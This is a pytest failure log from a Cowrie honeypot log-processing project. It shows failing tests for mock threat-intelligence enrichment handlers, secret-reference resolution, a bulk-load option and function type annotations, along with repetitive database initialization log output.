self = <test_mock_enrichment_handlers.TestMockOTXHandler object at 0x7756b40458c0>
mock_otx = <tests.fixtures.mock_enrichment_handlers.MockOTXHandler object at 0x7756b2f03bd0>

    def test_otx_check_file_hash_handles_known_good_hashes(self, mock_otx) -> None:
        """Mock OTX should return clean results for known good hashes."""
        good_hashes = ["aaaacleanhash", "clean12345678", "goodhash0000"]
    
        for hash_value in good_hashes:
            result = mock_otx.check_file_hash(hash_value)
            assert result["malware"] is False
>           assert result["pulses"] == 0
E           assert 1 == 0

/home/speterson/cowrieprocessor/tests/unit/test_mock_enrichment_handlers.py:111: AssertionError
____________ TestMockAbuseIPDBHandler.test_abuseipdb_custom_max_age ____________

self = <test_mock_enrichment_handlers.TestMockAbuseIPDBHandler object at 0x7756b4045ae0>
mock_abuseipdb = <tests.fixtures.mock_enrichment_handlers.MockAbuseIPDBHandler object at 0x775671f19480>

    def test_abuseipdb_custom_max_age(self, mock_abuseipdb) -> None:
        """Mock AbuseIPDB should handle different max age parameters."""
        ip = "192.168.1.100"
    
        # Different max_age should create different cache files
        result1 = mock_abuseipdb.check_ip(ip, max_age_days=30)
        result2 = mock_abuseipdb.check_ip(ip, max_age_days=90)
    
        cache_file_30 = mock_abuseipdb.cache_dir / f"abuse_{ip}_30.json"
        cache_file_90 = mock_abuseipdb.cache_dir / f"abuse_{ip}_90.json"
    
        assert cache_file_30.exists()
        assert cache_file_90.exists()
    
        # Results should be different due to different parameters
>       assert result1 != result2
E       AssertionError: assert {'data': {'abuseConfidenceScore': 0, 'countryCode': 'US', 'countryName': 'United States', 'domain': 'google.com', ...}} != {'data': {'abuseConfidenceScore': 0, 'countryCode': 'US', 'countryName': 'United States', 'domain': 'google.com', ...}}

/home/speterson/cowrieprocessor/tests/unit/test_mock_enrichment_handlers.py:215: AssertionError
_______________________ test_secret_reference_resolution _______________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_secret_reference_resoluti0')
load_process_cowrie = <function load_process_cowrie.<locals>._loader at 0x77567000c0e0>
monkeypatch = <_pytest.monkeypatch.MonkeyPatch object at 0x77567000c190>

    def test_secret_reference_resolution(tmp_path: Path, load_process_cowrie, monkeypatch: pytest.MonkeyPatch) -> None:
        """Verify reference-style CLI values are resolved before use."""
        captured: list[str] = []
    
        def pre_exec() -> None:
            def fake_is_reference(value: object) -> bool:
                captured.append(str(value))
                return str(value).startswith("ref:")
    
            def fake_resolve(value: object) -> str:
                return f"resolved:{value}"
    
            monkeypatch.setattr(secrets_resolver, "is_reference", fake_is_reference)
            monkeypatch.setattr(secrets_resolver, "resolve_secret", fake_resolve)
    
        module = load_process_cowrie(
            tmp_path,
            extra_args=["--vtapi", "ref:vt-key", "--urlhausapi", "literal-token"],
            pre_exec=pre_exec,
        )
    
>       assert "ref:vt-key" in captured
E       AssertionError: assert 'ref:vt-key' in ['None', 'None', 'None', 'None', 'None', 'None', ...]

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie.py:223: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:37,886:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:37,886:INFO:root:process_cowrie.py:initialize_database:Database initializing...
Database initializing...
Database initializing...
2025-10-18 18:32:37,886:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:37,886:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:37,886:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:37,886:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:37,887:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,887:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
Database transaction committed
Database transaction committed
2025-10-18 18:32:37,887:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,887:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,887:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,887:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,888:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:37,888:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
Hostname columns likely already exist...
Hostname columns likely already exist...
2025-10-18 18:32:37,888:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:37,888:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:37,888:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:37,888:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,888:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,888:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
Failure adding table columns, likely because they already exist...
Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,888:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,888:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,888:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,888:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,889:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,889:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
Failure adding table columns, likely because they already exist...
Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,889:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,889:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,889:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,889:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:37,890:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,890:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
Database transaction committed
Database transaction committed
2025-10-18 18:32:37,890:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,890:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,890:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,890:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,891:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:37,891:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
Database indexes ensured (IF NOT EXISTS)
Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:37,891:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:37,891:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:37,891:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:37,891:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:37,893:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,893:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
Database transaction committed
Database transaction committed
2025-10-18 18:32:37,893:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,893:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,893:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,893:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,894:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,894:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
Database transaction committed
Database transaction committed
2025-10-18 18:32:37,894:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,894:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,894:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:37,894:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
------------------------------ Captured log call -------------------------------
INFO     root:process_cowrie.py:881 Database initializing...
DEBUG    root:process_cowrie.py:867 Database transaction committed
INFO     root:process_cowrie.py:964 Hostname columns likely already exist...
ERROR    root:process_cowrie.py:1022 Failure adding table columns, likely because they already exist...
ERROR    root:process_cowrie.py:1028 Failure adding table columns, likely because they already exist...
DEBUG    root:process_cowrie.py:867 Database transaction committed
INFO     root:process_cowrie.py:1039 Database indexes ensured (IF NOT EXISTS)
DEBUG    root:process_cowrie.py:867 Database transaction committed
DEBUG    root:process_cowrie.py:867 Database transaction committed
_________________________ test_bulk_load_skips_commits _________________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_bulk_load_skips_commits0')
load_process_cowrie = <function load_process_cowrie.<locals>._loader at 0x77566d93f7e0>
monkeypatch = <_pytest.monkeypatch.MonkeyPatch object at 0x775669a018d0>

    def test_bulk_load_skips_commits(tmp_path: Path, load_process_cowrie, monkeypatch: pytest.MonkeyPatch) -> None:
        """When ``--bulk-load`` is supplied, intermediate commits are suppressed."""
        module = load_process_cowrie(tmp_path, extra_args=["--bulk-load"])
>       assert module.bulk_load is True
E       AssertionError: assert False is True
E        +  where False = <module 'process_cowrie_test_3f714105d01149c3be442810e4e3a35c' from '/home/speterson/cowrieprocessor/process_cowrie.py'>.bulk_load

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie.py:318: AssertionError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:38,099:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:38,099:INFO:root:process_cowrie.py:initialize_database:Database initializing...
Database initializing...
Database initializing...
2025-10-18 18:32:38,099:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:38,099:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:38,099:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:38,099:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:38,099:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:38,099:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:38,099:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:38,099:INFO:root:process_cowrie.py:initialize_database:Database initializing...
2025-10-18 18:32:38,100:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,100:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
Database transaction committed
Database transaction committed
2025-10-18 18:32:38,100:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,100:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,100:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,100:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,100:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,100:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,100:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,100:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,101:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:38,101:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
Hostname columns likely already exist...
Hostname columns likely already exist...
2025-10-18 18:32:38,101:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:38,101:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:38,101:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:38,101:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:38,101:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:38,101:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:38,101:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
2025-10-18 18:32:38,101:INFO:root:process_cowrie.py:initialize_database:Hostname columns likely already exist...
Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,102:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,102:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
Failure adding table columns, likely because they already exist...
Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,102:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,102:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,102:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,102:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,102:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,102:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,102:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,102:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,103:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,103:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
Failure adding table columns, likely because they already exist...
Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,103:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,103:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,103:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,103:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,103:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,103:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,103:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,103:ERROR:root:process_cowrie.py:initialize_database:Failure adding table columns, likely because they already exist...
2025-10-18 18:32:38,105:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,105:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
Database transaction committed
Database transaction committed
2025-10-18 18:32:38,105:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,105:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,105:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,105:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,105:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,105:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,105:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,105:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,107:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:38,107:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
Database indexes ensured (IF NOT EXISTS)
Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:38,107:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:38,107:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:38,107:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:38,107:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:38,107:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:38,107:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:38,107:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:38,107:INFO:root:process_cowrie.py:initialize_database:Database indexes ensured (IF NOT EXISTS)
2025-10-18 18:32:38,107:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,107:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
Database transaction committed
Database transaction committed
2025-10-18 18:32:38,107:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,107:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,107:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,107:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,107:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,107:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,107:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,107:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,108:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,108:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
Database transaction committed
Database transaction committed
2025-10-18 18:32:38,108:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,108:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,108:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,108:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,108:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,108:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,108:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
2025-10-18 18:32:38,108:DEBUG:root:process_cowrie.py:db_commit:Database transaction committed
------------------------------ Captured log call -------------------------------
INFO     root:process_cowrie.py:881 Database initializing...
DEBUG    root:process_cowrie.py:867 Database transaction committed
INFO     root:process_cowrie.py:964 Hostname columns likely already exist...
ERROR    root:process_cowrie.py:1022 Failure adding table columns, likely because they already exist...
ERROR    root:process_cowrie.py:1028 Failure adding table columns, likely because they already exist...
DEBUG    root:process_cowrie.py:867 Database transaction committed
INFO     root:process_cowrie.py:1039 Database indexes ensured (IF NOT EXISTS)
DEBUG    root:process_cowrie.py:867 Database transaction committed
DEBUG    root:process_cowrie.py:867 Database transaction committed
_________ TestProcessCowrieTypes.test_timeout_handler_type_annotations _________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b32b1d10>

    def test_timeout_handler_type_annotations(self) -> None:
        """Test that timeout_handler has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(timeout_handler)
    
        # Test function signature
        import inspect
        sig = inspect.signature(timeout_handler)
        assert len(sig.parameters) == 2
        assert sig.parameters['signum'].annotation == int
>       assert sig.parameters['frame'].annotation == Any
E       NameError: name 'Any' is not defined

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:55: NameError
__________ TestProcessCowrieTypes.test_with_timeout_type_annotations ___________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b32b1bd0>

    def test_with_timeout_type_annotations(self) -> None:
        """Test that with_timeout has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(with_timeout)
    
        # Test function signature
        import inspect
        sig = inspect.signature(with_timeout)
        assert len(sig.parameters) >= 2
        assert sig.parameters['timeout_seconds'].annotation == int
>       assert sig.parameters['func'].annotation == Any
E       NameError: name 'Any' is not defined

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:71: NameError
____________ TestProcessCowrieTypes.test_cache_get_type_annotations ____________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b3d29e00>

    def test_cache_get_type_annotations(self) -> None:
        """Test that cache_get has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(cache_get)
    
        # Test function signature
        import inspect
        sig = inspect.signature(cache_get)
        assert len(sig.parameters) == 2
        assert sig.parameters['service'].annotation == str
        assert sig.parameters['key'].annotation == str
>       assert sig.return_annotation == Optional[Any]
E       NameError: name 'Optional' is not defined

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:103: NameError
__________ TestProcessCowrieTypes.test_cache_upsert_type_annotations ___________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b3e02210>

    def test_cache_upsert_type_annotations(self) -> None:
        """Test that cache_upsert has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(cache_upsert)
    
        # Test function signature
        import inspect
        sig = inspect.signature(cache_upsert)
        assert len(sig.parameters) == 3
        assert sig.parameters['service'].annotation == str
        assert sig.parameters['key'].annotation == str
>       assert sig.parameters['data'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "data: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:119: AssertionError
_____ TestProcessCowrieTypes.test_get_connected_sessions_type_annotations ______

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b40467a0>

    def test_get_connected_sessions_type_annotations(self) -> None:
        """Test that get_connected_sessions has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(get_connected_sessions)
    
        # Test function signature
        import inspect
        sig = inspect.signature(get_connected_sessions)
        assert len(sig.parameters) == 1
>       assert sig.parameters['data'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "data: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:134: AssertionError
_________ TestProcessCowrieTypes.test_get_session_id_type_annotations __________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b3c68490>

    def test_get_session_id_type_annotations(self) -> None:
        """Test that get_session_id has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(get_session_id)
    
        # Test function signature
        import inspect
        sig = inspect.signature(get_session_id)
        assert len(sig.parameters) == 3
>       assert sig.parameters['data'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "data: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:149: AssertionError
______ TestProcessCowrieTypes.test_get_session_duration_type_annotations _______

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b3c7d650>

    def test_get_session_duration_type_annotations(self) -> None:
        """Test that get_session_duration has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(get_session_duration)
    
        # Test function signature
        import inspect
        sig = inspect.signature(get_session_duration)
        assert len(sig.parameters) == 2
        assert sig.parameters['session'].annotation == str
>       assert sig.parameters['data'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "data: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:167: AssertionError
_______ TestProcessCowrieTypes.test_get_protocol_login_type_annotations ________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b3586150>

    def test_get_protocol_login_type_annotations(self) -> None:
        """Test that get_protocol_login has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(get_protocol_login)
    
        # Test function signature
        import inspect
        sig = inspect.signature(get_protocol_login)
        assert len(sig.parameters) == 2
        assert sig.parameters['session'].annotation == str
>       assert sig.parameters['data'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "data: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:183: AssertionError
_________ TestProcessCowrieTypes.test_get_login_data_type_annotations __________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b40694f0>

    def test_get_login_data_type_annotations(self) -> None:
        """Test that get_login_data has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(get_login_data)
    
        # Test function signature
        import inspect
        sig = inspect.signature(get_login_data)
        assert len(sig.parameters) == 2
        assert sig.parameters['session'].annotation == str
>       assert sig.parameters['data'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "data: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:199: AssertionError
________ TestProcessCowrieTypes.test_get_command_total_type_annotations ________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b4069220>

    def test_get_command_total_type_annotations(self) -> None:
        """Test that get_command_total has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(get_command_total)
    
        # Test function signature
        import inspect
        sig = inspect.signature(get_command_total)
        assert len(sig.parameters) == 2
        assert sig.parameters['session'].annotation == str
>       assert sig.parameters['data'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "data: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:215: AssertionError
________ TestProcessCowrieTypes.test_get_file_download_type_annotations ________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b36360b0>

    def test_get_file_download_type_annotations(self) -> None:
        """Test that get_file_download has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(get_file_download)
    
        # Test function signature
        import inspect
        sig = inspect.signature(get_file_download)
        assert len(sig.parameters) == 2
        assert sig.parameters['session'].annotation == str
>       assert sig.parameters['data'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "data: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:231: AssertionError
_________ TestProcessCowrieTypes.test_get_file_upload_type_annotations _________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b3636c10>

    def test_get_file_upload_type_annotations(self) -> None:
        """Test that get_file_upload has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(get_file_upload)
    
        # Test function signature
        import inspect
        sig = inspect.signature(get_file_upload)
        assert len(sig.parameters) == 2
        assert sig.parameters['session'].annotation == str
>       assert sig.parameters['data'].annotation == object
E       assert typing.Any == object
E        +  where typing.Any = <Parameter "data: Any">.annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:247: AssertionError
__________ TestProcessCowrieTypes.test_dshield_query_type_annotations __________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b35ba510>

    def test_dshield_query_type_annotations(self) -> None:
        """Test that dshield_query has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(dshield_query)
    
        # Test function signature
        import inspect
        sig = inspect.signature(dshield_query)
        assert len(sig.parameters) == 1
        assert sig.parameters['ip_address'].annotation == str
>       assert sig.return_annotation == dict
E       assert typing.Dict[str, typing.Any] == dict
E        +  where typing.Dict[str, typing.Any] = <Signature (ip_address: str) -> Dict[str, Any]>.return_annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:295: AssertionError
________ TestProcessCowrieTypes.test_safe_read_uh_data_type_annotations ________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b3787b70>

    def test_safe_read_uh_data_type_annotations(self) -> None:
        """Test that safe_read_uh_data has proper type annotations."""
        # This test ensures we're using proper type annotations
        import os
    
        # Check that the function exists and has proper type annotations
        assert callable(safe_read_uh_data)
    
        # Test function signature
        import inspect
        sig = inspect.signature(safe_read_uh_data)
        assert len(sig.parameters) == 2
        assert sig.parameters['ip_address'].annotation == str
        assert sig.parameters['urlhausapi'].annotation == str
>       assert sig.return_annotation == dict
E       assert typing.Dict[str, typing.Any] == dict
E        +  where typing.Dict[str, typing.Any] = <Signature (ip_address: str, urlhausapi: str) -> Dict[str, Any]>.return_annotation

/home/speterson/cowrieprocessor/tests/unit/test_process_cowrie_types.py:311: AssertionError
_________ TestProcessCowrieTypes.test_read_spur_data_type_annotations __________

self = <test_process_cowrie_types.TestProcessCowrieTypes object at 0x7756b3787a10>

